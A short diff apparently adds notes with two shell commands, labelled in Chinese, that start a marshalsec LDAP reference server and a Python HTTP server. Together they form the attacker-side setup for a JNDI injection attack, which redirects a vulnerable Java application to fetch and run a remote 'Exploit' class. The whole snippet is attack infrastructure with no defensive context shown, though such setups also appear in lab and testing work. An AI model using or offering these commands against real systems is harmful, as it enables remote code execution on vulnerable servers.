@@ -1,0 +1,5 @@
+// 启动ldap服务器
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer  "http://127.0.0.1:4444/#Exploit" 1389
+
+// 启动http服务器
+python -m http.server 4444
